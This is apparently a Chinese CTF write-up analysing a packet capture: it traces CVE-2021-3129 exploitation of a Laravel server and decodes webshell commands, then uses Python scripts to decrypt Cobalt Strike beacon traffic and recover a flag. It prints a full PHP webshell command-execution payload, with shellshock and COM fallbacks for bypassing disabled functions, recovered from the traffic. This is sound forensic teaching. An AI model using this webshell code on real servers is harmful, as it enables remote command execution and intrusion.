---
title: 从一道例题分析CS流量解密
published: 2022-09-26 10:33
tags: [安全, CS, 流量分析, 解密]
category: 网安
draft: false
---

# 从一道例题分析CS流量解密

## 0x00 题目

解压是一个名字为`一起上号不.pcapng`的流量包文件

## 0x01 分析

分析这是一个`CS`的流量，在下面的博客中可以了解一下`CS`的流量特征

```
https://www.mandiant.com/resources/blog/defining-cobalt-strike-components
```
![1](/images/posts/cs-traffic-decrypt/1.jpg)

筛选`http`流量

![2](/images/posts/cs-traffic-decrypt/2.jpg)


发现一个`key.zip`，将其导出

![3](/images/posts/cs-traffic-decrypt/3.jpg)


这里由于没有题目附件，后面主要演示两个用于`CS`流量解密的项目

```python
https://github.com/Slzdude/cs-scripts           # 得到CS的公私钥
https://github.com/WBGlIl/CS_Decrypt            # 解密我们发送和接受的流量
```

![4](/images/posts/cs-traffic-decrypt/4.jpg)


得到公私钥

![5](/images/posts/cs-traffic-decrypt/5.jpg)


然后是需要解密`CS`流量，首先要拿到一个叫做协商密钥的东西，这个密钥和主机信息在进行RSA公钥加密之后，会放到心跳包的`Cookie`信息中，比如任意打开一个`GET`请求，这个加密的内容就存有协商密钥`hmac key`

![6](/images/posts/cs-traffic-decrypt/6.jpg)


现在就需要解开这个加密的`Cookie`，这里用到的是下面的项目

```python
https://github.com/WBGlIl/CS_Decrypt
# 这里面有一个库是M2Crypto，前提需要安装swig，而windows安装swig之后安装M2Crypto仍然存在问题，为解决，这里用两这种方法
```

### 方法1 使用Linux

```assembly
# 安装swig
pip3 install swig
# 不知道是版本存在问题还是其他原因，自动安装swig之后安装M2Crypto会出现报错，自行下载编译
wget https://sourceforge.net/projects/swig/files/swig/swig-4.1.1/swig-4.1.1.tar.gz
tar -xvzf swig-4.1.1.tar.gz
./configure
make & make install
swig -version      # 查看是否安装成功
# 可能出现编译错误的情况，因为没有安装PCRE2开发包
sudo apt-get install libpcre2-dev
# 然后安装M2Crypto
pip3 install M2Crypto
```

PS：此方法实测之后不建议，最终子系统安装失败，`kali`安装成功



### 方法2 更新迭代函数方法

脚本问题比较大，`M2Crypto`早已停更不太好装，所以换成了密码学里比较常见的`pycryptodome`库，然后那个私钥模板开头多了个换行导致`pycryptodome`不识别（`M2Crypto`应该没这个问题），以及私钥的主体内容需要按标准的`64`位换行分隔一下。

原代码：

```python
'''
Beacon元数据
'''
import hashlib
import M2Crypto
import base64
import hexdump

PRIVATE_KEY = """
-----BEGIN RSA PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIqpewO+lqNYuxQh
Qwq7pMdM7CP92uer5FkUA41vPaelrbpqr1ujH95Q7Rfqt7E7Vc+Xx5dYQCoRaysj
Nm+UfuRcFocLHG2ugf4+/NEX/NFE+gI279wXfC+zZ0MGFMQIAC1TClaiMvALwMB9
nBuXK/CErC754co9cIbaIkCl/sRXAgMBAAECgYBqlSFYXHwfrMmIDJUiv99FzovI
ko1b/FV2Xxrn8TS8E265Vt3Zm0aYtS25b5Ko6YnpGqqxW4VekKsGqndiRwtNSbIi
lU1EqWqfdBmucptnISgDdx+ofWbInTRl+leBzDW4Zsl2sMvMmmyhsc/X35pGbH2l
RXXEegPzradtyBwhUQJBANt2IC4p5CQW2UxXVjmrTbA+CuJLfnZE+97HCjzZPi/g
UiF4akFQx46x0vT1RmcalqUg1Prl7OoKb05Lmwm0XukCQQChv4blpfqVcdz9X6MG
JqeaiC22EPZn+2dhm4PbZIhurs57M7+dqlYxoG6LneU0H1N8ieeH9fb9ixG/8+F7
iIE/AkEAzyzYfDv3r0oSoMriD1bz5CjtxWtXWvcMfuaPd5nt5uxxHD+8ryQ+/ypH
6A+UAslK5V/1L1XXLankIZmmJqcr4QJAGUAkF//EUcY3wJpIgfJQ4e/2auDVBsCZ
kAROHlbgcZ76fwNCG6P21sJ733Hj0TI+v0dsDK6aQ1SNjdDN15Ik0wJBAK7C5l0Q
F8NRlIw2+tPUSDVy/PRUVmpRRd4cD4HXNtVMg0Dr3L7vx9PeyJH0EFuaVWItdBDI
LP0HzUR1/wk5ZFY=
-----END RSA PRIVATE KEY-----
"""

encode_data = "bGOniQ5nfrSmAW9fgdZSCC+42t5xvQt+B4SVEu6Q8MvC4rPn/OThepmxP6GjDiP1wCUB1EE3sqeXkwdHHMd9wikZhiQnjT9AB3e2RNacCVF+8v/nj/Rv85fSD2Phfc/wsaAjld9Fy8ZJJKz1wPwPY6lTxArMGFtX7W+VW/gzujI="
base64_key = ""

pubkey = M2Crypto.RSA.load_key_string(PRIVATE_KEY.format(base64_key).encode())
ciphertext = pubkey.private_decrypt(base64.b64decode(encode_data), M2Crypto.RSA.pkcs1_padding)

...（后面代码相同，只需要修改前面的加密key的函数方法）
```

新代码：

```python
'''
Beacon元数据
'''
import hashlib
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import base64
import hexdump
 
PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
{}
-----END RSA PRIVATE KEY-----"""
 
encode_data = "bGOniQ5nfrSmAW9fgdZSCC+42t5xvQt+B4SVEu6Q8MvC4rPn/OThepmxP6GjDiP1wCUB1EE3sqeXkwdHHMd9wikZhiQnjT9AB3e2RNacCVF+8v/nj/Rv85fSD2Phfc/wsaAjld9Fy8ZJJKz1wPwPY6lTxArMGFtX7W+VW/gzujI="
base64_key = """MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIqpewO+lqNYuxQh
Qwq7pMdM7CP92uer5FkUA41vPaelrbpqr1ujH95Q7Rfqt7E7Vc+Xx5dYQCoRaysj
Nm+UfuRcFocLHG2ugf4+/NEX/NFE+gI279wXfC+zZ0MGFMQIAC1TClaiMvALwMB9
nBuXK/CErC754co9cIbaIkCl/sRXAgMBAAECgYBqlSFYXHwfrMmIDJUiv99FzovI
ko1b/FV2Xxrn8TS8E265Vt3Zm0aYtS25b5Ko6YnpGqqxW4VekKsGqndiRwtNSbIi
lU1EqWqfdBmucptnISgDdx+ofWbInTRl+leBzDW4Zsl2sMvMmmyhsc/X35pGbH2l
RXXEegPzradtyBwhUQJBANt2IC4p5CQW2UxXVjmrTbA+CuJLfnZE+97HCjzZPi/g
UiF4akFQx46x0vT1RmcalqUg1Prl7OoKb05Lmwm0XukCQQChv4blpfqVcdz9X6MG
JqeaiC22EPZn+2dhm4PbZIhurs57M7+dqlYxoG6LneU0H1N8ieeH9fb9ixG/8+F7
iIE/AkEAzyzYfDv3r0oSoMriD1bz5CjtxWtXWvcMfuaPd5nt5uxxHD+8ryQ+/ypH
6A+UAslK5V/1L1XXLankIZmmJqcr4QJAGUAkF//EUcY3wJpIgfJQ4e/2auDVBsCZ
kAROHlbgcZ76fwNCG6P21sJ733Hj0TI+v0dsDK6aQ1SNjdDN15Ik0wJBAK7C5l0Q
F8NRlIw2+tPUSDVy/PRUVmpRRd4cD4HXNtVMg0Dr3L7vx9PeyJH0EFuaVWItdBDI
LP0HzUR1/wk5ZFY="""
 
private_key = RSA.import_key(PRIVATE_KEY.format(base64_key).encode())
cipher = PKCS1_v1_5.new(private_key)
ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0)
```

结果相同：（这里的例题是`2021绿城杯`的`MISC`流量题）

![7](/images/posts/cs-traffic-decrypt/7.jpg)


![8](/images/posts/cs-traffic-decrypt/8.jpg)


上面的东西比较乱，整体来说就是分析`CS`流量特征、加密原理和解密方式，最后一步的`AES`解密还没有完成，这里用到同一个项目的另一个文件：`Beacon_Task_return_AES_Decrypt.py`，其实还有一个`CS_Task_AES_Decrypt.py`文件应该也可以解，但是出现`bug`暂不考虑。下面通过一道经典赛题进行解释复现

## 0x02 2021绿城杯misc——一道复杂的流量题目

更细节的题目分析在各大师傅的博客中已经有了讲解，这里做的只是分析`CS`流量之后的解密获取`flag`的过程

打开`pcapng`文件查看协议分级，大部分是`tcp`，奠定了分析的基本方向

![9](/images/posts/cs-traffic-decrypt/9.jpg)


先分析`http`流量，是`Laravel`模块

![10](/images/posts/cs-traffic-decrypt/10.jpg)


发现可疑字段，且通过请求内容判断是`CVE-2021-3129`漏洞

![11](/images/posts/cs-traffic-decrypt/11.jpg)


这个漏洞是`Laravel`远程代码漏洞，对字符串进行解密，解密方法如下：

```
1、去掉 AAA*
2、替换 =00 为空
3、进行 base64 解码
4、多解密几个就发现写入 webshell
```

可以看到很多这种通过伪协议进行读取文件的`payload`，后面的密文解密中发现了写入`webshell`

![12](/images/posts/cs-traffic-decrypt/12.jpg)
![13](/images/posts/cs-traffic-decrypt/13.jpg)

得到了`Webshell`密码为`14433`，查找一句话木马特征，找到解密方法，可以看到`.config`的返回都是执行命令的结果
![14](/images/posts/cs-traffic-decrypt/14.jpg)


通过下面的筛选器能够得到`.config`文件的请求

```
http && frame contains ".config"
```
![15](/images/posts/cs-traffic-decrypt/15.jpg)

向下一个个查看返回包，发现了一个压缩包的文件
![16](/images/posts/cs-traffic-decrypt/16.jpg)

转换为原始数据，然后搜索`zip`文件的文件头`504b0304`

![17](/images/posts/cs-traffic-decrypt/17.jpg)

下载下来解压需要密码

![18](/images/posts/cs-traffic-decrypt/18.jpg)

这里就能够得知此题目要求的是解密`CS`流量，和前面的分析一样，需要解开压缩包，得到公私钥，然后进行解密，现在需要找到压缩包密码，`CS`传输过程中会加密和解密，查看得到压缩包后面的流量包，能够发现`7-zip`解压的关键字，判断密码在这个流中
![19](/images/posts/cs-traffic-decrypt/19.jpg)
![20](/images/posts/cs-traffic-decrypt/20.jpg)


```php
<?php
@ini_set("display_errors", "0");
@set_time_limit(0);
$opdir=@ini_get("open_basedir");
if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);
    $oparr=preg_split("/;
|:/",$opdir);
    @array_push($oparr,$ocwd,sys_get_temp_dir());
    foreach($oparr as $item) {if(!@is_writable($item)){continue;
    };
        $tmdir=$item."/.fedd1";
        @mkdir($tmdir);
        if(!@file_exists($tmdir)){continue;
        }@chdir($tmdir);
        @ini_set("open_basedir", "..");
        $cntarr=@preg_split("/\\\\\\\\|\\//",$tmdir);
        for($i=0;
            $i<sizeof($cntarr);
            $i++){@chdir("..");
        };
        @ini_set("open_basedir","/");
        @rmdir($tmdir);
        break;
    };
};
;
function asenc($out){return $out;
};
function asoutput(){$output=ob_get_contents();
    ob_end_clean();
    echo "36"."4f2";
    echo @asenc($output);
    echo "42"."ff1";
}ob_start();
try{$p=base64_decode(substr($_POST["f861d394170244"],2));
    $s=base64_decode(substr($_POST["ufbd335828f30f"],2));
    $envstr=@base64_decode(substr($_POST["b430b310838a93"],2));
    $d=dirname($_SERVER["SCRIPT_FILENAME"]);
    $c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";
if(substr($d,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
}else{@putenv("PATH=".getenv("PATH").";
C:/Windows/system32;
C:/Windows/SysWOW64;
C:/Windows;
C:/Windows/System32/WindowsPowerShell/v1.0/;
");
}if(!empty($envstr)){$envarr=explode("|||asline|||", $envstr);
        foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace("|||askey|||", "=", $v));
        }}}$r="{$p} {$c}";
function fe($f){$d=explode(",",@ini_get("disable_functions"));
    if(empty($d)){$d=array();
    }else{$d=array_map(\'trim\',array_map(\'strtolower\',$d));
}return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));
};
function runshellshock($d, $c) {if (substr($d, 0, 1) == "/" && fe(\'putenv\') && (fe(\'error_log\') || fe(\'mail\'))) {if (strstr(readlink("/bin/sh"), "bash") != FALSE) {$tmp = tempnam(sys_get_temp_dir(), \'as\');
putenv("PHP_LOL=() { x;
 };
 $c >$tmp 2>&1");
if (fe(\'error_log\')) {error_log("a", 1);
} else {mail("a@127.0.0.1", "", "", "-bv");
}} else {return False;
}$output = @file_get_contents($tmp);
@unlink($tmp);
if ($output != "") {print($output);
return True;
}}return False;
};
function runcmd($c){$ret=0;
$d=dirname($_SERVER["SCRIPT_FILENAME"]);
if(fe(\'system\')){@system($c,$ret);
}elseif(fe(\'passthru\')){@passthru($c,$ret);
}elseif(fe(\'shell_exec\')){print(@shell_exec($c));
}elseif(fe(\'exec\')){@exec($c,$o,$ret);
print(join("\n",$o));
}elseif(fe(\'popen\')){$fp=@popen($c,\'r\');
while(!@feof($fp)){print(@fgets($fp,2048));
}@pclose($fp);
}elseif(fe(\'proc_open\')){$p = @proc_open($c, array(1 => array(\'pipe\', \'w\'), 2 => array(\'pipe\', \'w\')), $io);
while(!@feof($io[1])){print(@fgets($io[1],2048));
}while(!@feof($io[2])){print(@fgets($io[2],2048));
}@fclose($io[1]);
@fclose($io[2]);
@proc_close($p);
}elseif(fe(\'antsystem\')){@antsystem($c);
}elseif(runshellshock($d, $c)) {return $ret;
}elseif(substr($d,0,1)!="/" && @class_exists("COM")){$w=new COM(\'WScript.shell\');
$e=$w->exec($c);
$so=$e->StdOut();
$ret.=$so->ReadAll();
$se=$e->StdErr();
$ret.=$se->ReadAll();
print($ret);
}else{$ret = 127;
}return $ret;
};
$ret=@runcmd($r." 2>&1");
print ($ret!=0)?"ret={$ret}":"";
;
}catch(Exception $e){echo "ERROR://".$e->getMessage();
};
asoutput();
die();
```

解开后得到的是套娃的`webshell`命令，解密方式是三个参数的值去掉前两个字符拼接后进行`base64`解码即可

```php
$p=base64_decode(substr($_POST["f861d394170244"],2));
$s=base64_decode(substr($_POST["ufbd335828f30f"],2));
$envstr=@base64_decode(substr($_POST["b430b310838a93"],2));
```

```
b430b310838a93=4g
f861d394170244=X4Y21k
ufbd335828f30f=0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm
```

得到密码：`P4Uk6qkh6Gvqwg3y`

![21](/images/posts/cs-traffic-decrypt/21.jpg)

解密脚本：

```python
# !/usr/bin/python3
from pwn import *
import zlib

s = 'jRZrb9pI8Pv9CmdlBVt1wGBKafacc1RRtVJ6iUJ0%2BdBUlrHXYS%2FGtnZNSA78329m%2FYIk1ysItDM77%2Bd6POW%2BZIVBIi7zJHj2mRCZkMTSiE1M6sGdX%2FAV8xO%2B4oVhm1TP8ogL10POe%2BTMcpb6i0AyQAMLj42KxNS2ehZuIhfOabBihu7PZ9d%2Fza6%2Fk%2Fmn669XN%2F7nrxezP8%2B%2FzcgPJTYQws0Fu%2FfBEtBFBnR3OiBWLY16cA8G5mu5NCpqS8m35LNES%2FyCrXIfSA3TpHEmWBA2hFogNZ3DPdgE9h15XPobwYtgkYBZ6sLchlla8HTNaEn1YoU%2Bqps%2BGfSn09CZOM5kQqi3ekAVFYXy9siLecJ89sRlIZuLfXFeuNxn8dqYH0QOIt7vQ%2Fz0MC0wEt5BKO7gs7sbYDhqMeAhmO7aVOe%2FS%2F4PyyDuFSvI4O%2FemdtabyW2%2FE%2B9ZICJFqt9GxcQvQfgKSmN12lY8CyFGLI0hICuC3MrWLEWqYYA0OyRACJfF4a51auTmy1UbjAaLIX4mBQwLI38MGFBCiALl5lGxtP4vU365GMwGTukQnqdRpDUUsb2dAKUQ8e2Y0JLECfBa9BJC%2FG81XMXPZuM%2FYiFWcQMuV7IAjzzry7nN99JPJ0MI%2BfjePjBHo3H5Ic1gmrR5c%2BZ1vEicpz309E0dkBpzcTSRyByvZ%2ByLsaOvXCG9tSZBh%2BdhvVXmyJ0G3GRZVtD03UhW3%2BQk1C7I1tdlneEnJLBHoQF%2BQYLFAOEEAw2yNX5zReX9CEpLUjMPjkdrKUYJFkYJAO54Ok%2B3ILdhTpUIPxhfbFEsv%2FVQj%2BdDm55GmUbOYC2hfZyRvu4%2BbO8vbydjPdwL64VS4O4yjZMzJcsSQaPw749oGgItiRMguLZqDMEzYgnbCr2lCeYJLLb7QKZ8JTBAVqvoezmRsWgBsejmhpaK%2FXRBETjKXD5gsHoDBupD%2By5EkpclAzUtCxLXbiQo7yEoRiWpGuZGEogBgOjzjaLWN10hbmMU8pvGCQx1dSpbYlMxatGo9FkoUH4qyA3eoXgq561hwCTiyzB0PUsFEDLqp2NRkc7y2Lz%2BBhGJdRAUo1KRBzx1K%2F06XHN37kj1qnEfMhlFj5gCWp6WIevK0vNtrShqbmuBqWpHR9jEHpVPHsmwgYi1Cbyk%2BwecLudolkFPOmZZiOwECgQEhZBJh9gSkIpDuSSmBB7aEo4aEeu9vn8Yj7DZVSscs3VcEtA5xmvt4al9QLZM2lbw1%2Bu%2FIvLC9cAZu2JaiUFZ7QzJWd0djxUy%2B6VrUDcQgYJCLpKSw0To23RAUB6w9GHvg3fIZZJ8ztZPGL9NrT1jP0cAETLegqCA9W6ORiqaBLM8HWq4lBBaFrDBFEgEIxtLnhadAO11nAjcEuVh%2FoOUhquIlguUGlAgxvnF8cXlCkGp2p0iMzWq44gy0JRdb3WZHkgZbEUa0XYAG%2BTqhKDKmUhEldeeR0SbT1kaEi9%2BhpeDrXYivnvjKcG%2BQ0fGy84c1yWyKrHOexkhJC%2FJ6BQNkvIBO5%2FtXzjvLMlhvRg%2F%2BTWyB5PUaSXh0kmmSI7VCCy0G%2BVYIV6LQo1aVWvDTX3rD72cp6zHlTrpgc1O3r7Am50nr20kWffhz9emamwraWvOEZvcow6Di%2BufavE0314hLByqMa9cD%2BA%2Bu3qo4UwhS3dm0PFbDsEE9nSHi6%2FI7eeMF6YQEU1g418uvxGMNwbN2UbDSCjdzsPBc%2BLvtLUw%2FXu6puTs6ae4I2QuTo7OZsX0SW%2BcCiq7buAPjm7hhF0niSIlKyhmgmxR8X2qeo%2B7OpadRakHuZCM41rt5QA12uaUPRJM3uUEE1JOXJt8w%2BChEpQCY8CQmkZBgWsstlTyHLVyTozt9UjanZ9fXl9Cs%2FJPhoLOf3GpAzuGa4Q2r3iaMQR9S8%3D'
s = urldecode(s)
m = zlib.decompress(b64d(s), -zlib.MAX_WBITS)

print(m)
print(b64d('X4Y21k'[2:]))
print(b64d('0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm'[2:]))
```

解压压缩包得到`key`，分解得到公私钥

PS：这里脚本分解可能会失败，不能安装`javaobj`库，需要安装的是`javaobj-py3`库

```
pip3 install javaobj-py3
```
![22](/images/posts/cs-traffic-decrypt/22.jpg)


```
-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIqpewO+lqNYuxQhQwq7pMdM7CP9
2uer5FkUA41vPaelrbpqr1ujH95Q7Rfqt7E7Vc+Xx5dYQCoRaysjNm+UfuRcFocLHG2ugf4+/NEX
/NFE+gI279wXfC+zZ0MGFMQIAC1TClaiMvALwMB9nBuXK/CErC754co9cIbaIkCl/sRXAgMBAAEC
gYBqlSFYXHwfrMmIDJUiv99FzovIko1b/FV2Xxrn8TS8E265Vt3Zm0aYtS25b5Ko6YnpGqqxW4Ve
kKsGqndiRwtNSbIilU1EqWqfdBmucptnISgDdx+ofWbInTRl+leBzDW4Zsl2sMvMmmyhsc/X35pG
bH2lRXXEegPzradtyBwhUQJBANt2IC4p5CQW2UxXVjmrTbA+CuJLfnZE+97HCjzZPi/gUiF4akFQ
x46x0vT1RmcalqUg1Prl7OoKb05Lmwm0XukCQQChv4blpfqVcdz9X6MGJqeaiC22EPZn+2dhm4Pb
ZIhurs57M7+dqlYxoG6LneU0H1N8ieeH9fb9ixG/8+F7iIE/AkEAzyzYfDv3r0oSoMriD1bz5Cjt
xWtXWvcMfuaPd5nt5uxxHD+8ryQ+/ypH6A+UAslK5V/1L1XXLankIZmmJqcr4QJAGUAkF//EUcY3
wJpIgfJQ4e/2auDVBsCZkAROHlbgcZ76fwNCG6P21sJ733Hj0TI+v0dsDK6aQ1SNjdDN15Ik0wJB
AK7C5l0QF8NRlIw2+tPUSDVy/PRUVmpRRd4cD4HXNtVMg0Dr3L7vx9PeyJH0EFuaVWItdBDILP0H
zUR1/wk5ZFY=
-----END PRIVATE KEY-----
```

```
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCKqXsDvpajWLsUIUMKu6THTOwj/drnq+RZFAON
bz2npa26aq9box/eUO0X6rexO1XPl8eXWEAqEWsrIzZvlH7kXBaHCxxtroH+PvzRF/zRRPoCNu/c
F3wvs2dDBhTECAAtUwpWojLwC8DAfZwblyvwhKwu+eHKPXCG2iJApf7EVwIDAQAB
-----END PUBLIC KEY-----
```

解密只需要私钥即可，任意找到一个`GET`请求的心跳包，一般是`/en_US/all.js`路径

![23](/images/posts/cs-traffic-decrypt/23.jpg)


解密`Cookie`得到`AES key`和`HMAC key`

![24](/images/posts/cs-traffic-decrypt/24.jpg)


```assembly
Beacon id:1515569398
pid:7956
port:0
barch:x86
is64:1
bypass:True
windows var:6.2
windows build:9200
host:192.168.132.138
PC name:DESKTOP-QQF0MLN
username:Administrator
process name:beacon.exe
AES key:7c83bf30a6ad2dc410040d33e1399cf6
HMAC key:a77945b3a56687a39f90683cb24d00c2
00000000: 00 00 BE EF 00 00 00 5B  B5 55 DE 5D CE 3B 9E 3E  .......[.U.].;.>
00000010: B4 B5 72 2F 6A A6 BC 85  A8 03 A8 03 5A 55 C0 F6  ..r/j.......ZU..
00000020: 00 00 1F 14 00 00 0C 06  02 23 F0 00 00 00 00 75  .........#.....u
00000030: 9A 16 D0 75 9A 05 A0 8A  84 A8 C0 44 45 53 4B 54  ...u.......DESKT
00000040: 4F 50 2D 51 51 46 30 4D  4C 4E 09 41 64 6D 69 6E  OP-QQF0MLN.Admin
00000050: 69 73 74 72 61 74 6F 72  09 62 65 61 63 6F 6E 2E  istrator.beacon.
00000060: 65 78 65                                          exe
None
```

有了所有的`key`，现在可以进行解密，对需要解密的数据还需进行最后一步处理，这里需要解密的内容路径是`/submit.php`

```
需要解密的数据-->原始数据-->hex-->base64
```
![25](/images/posts/cs-traffic-decrypt/25.jpg)


选择原始数据，数据是`00000`开头的内容

![26](/images/posts/cs-traffic-decrypt/26.jpg)
![27](/images/posts/cs-traffic-decrypt/27.jpg)


完善脚本，进行解密，若运行发现编码错误，可能是由于题目测试的文件夹路径是中文，这里直接将错误进行忽略：

```python
print(de_data[4:dec_length].decode('utf-8', errors='ignore'))    # 第69行
```
![28](/images/posts/cs-traffic-decrypt/28.jpg)


好像是一个`dir`命令的回显，看到了`flag`目录，向下再找找

![29](/images/posts/cs-traffic-decrypt/29.jpg)


可以使用下列筛选器

```
http && frame contains "submit"
```

找最后一个数据流

![30](/images/posts/cs-traffic-decrypt/30.jpg)


得到`flag{787fc697-8773-4669-84ad-94f714e7df09}`

![31](/images/posts/cs-traffic-decrypt/31.jpg)

## 0x03 总结

上述整体为这次`CS`流量的简单分析和解密，当初并没有解开这道题目，几年过去再次拿出来分析还是有不少的收获。